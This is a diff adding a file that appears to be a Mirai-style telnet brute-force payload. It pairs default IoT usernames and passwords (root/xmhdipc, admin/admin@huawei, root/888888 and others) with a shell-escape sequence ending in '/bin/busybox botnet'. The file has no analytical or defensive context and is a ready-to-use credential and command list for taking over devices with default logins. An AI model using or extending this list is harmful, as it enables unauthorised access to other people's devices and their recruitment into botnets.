@@ -1,0 +1,80 @@
+root
+
+888888
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+admin@huawei
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+123456
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+aa123
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+admin1234
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+xmhdipc
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+twe8ehome
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+nflection
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+1234
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+1001chin
+enable
+system
+shell
+sh
+/bin/busybox botnet
